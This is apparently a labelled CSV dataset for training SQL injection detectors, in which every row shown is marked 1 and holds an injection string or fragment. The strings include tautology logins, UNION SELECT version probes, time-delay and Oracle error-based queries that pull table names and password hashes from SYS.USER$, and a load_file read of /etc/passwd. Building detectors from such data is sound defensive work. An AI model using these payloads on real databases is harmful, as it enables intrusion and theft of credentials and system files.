,Sentence,Label
1,""" or pg_sleep ( __TIME__ ) --",1
2,create user name identified by pass123 temporary tablespace temp default tablespace users; ,1
3,%29,1
4,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
5," select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'",1
6," select * from users where id = 1 or 1#"" (  union select 1,version (  )  -- 1",1
7,' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --,1
8, select * from users where id = 1 +$+ or 1 = 1 -- 1,1
9,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;",1
10," select * from users where id = '1' or ||/1 = 1 union select 1,version (  )  -- 1'",1
11," select * from users where id = '1' or \.<\ union select 1,@@VERSION -- 1'",1
12,? or 1 = 1 --,1
13, )  or  ( 'a' = 'a,1
14,admin' or 1 = 1#,1
15," select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1",1
16,or 1 = 1 --,1
17,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
18," select * from users where id = '1' %!<@ union select 1,version (  )  -- 1'",1
19," select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",1
20,# from wapiti,1
21, ( ||6 ) ,1
22," select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",1
23,'*',1
24,distinct,1
25,*/*,1
26, select * from users where id = '1' * ( \ )  or 1 = 1 -- 1',1
27,to_timestamp_tz,1
28,a' ,1
29,"1 and ascii ( lower ( substring  (  (  select top 1 name from sysobjects where xtype = 'u' ) , 1, 1  )  )   )  > 116",1
30, select * from users where id = 1 or \.<\ or 1 = 1 -- 1,1
31,"admin"" or ""1"" = ""1""--",1
32," select * from users where id = 1 or ""%{"" or 1 = 1 -- 1",1
33,insert,1
34,@,1
35," select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1",1
36," select * from users where id = 1 or ""%?"" or 1 = 1 -- 1",1
37,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
38,26 %,1
39," select * from users where id = 1 or ""?#"" or 1 = 1 -- 1",1
40,"or 1 = 1 or """" = ",1
41,'/**/or/**/1/**/ = /**/1,1
42," select * from users where id = 1 or "". ( "" or 1 = 1 -- 1",1
43," select * from users where id = '1' union select ||/1,version (  )  -- 1'",1
44," select * from users where id = '1' union select +\.,@@VERSION -- 1'",1
45,or 1 = 1/*,1
46,%27 or 1 = 1,1
47," select * from users where id = 1 <@&@ union select 1,version (  )  -- 1",1
48," select * from users where id = '1' union select $*$,@@VERSION -- 1'",1
49,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...",1
50," select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'",1
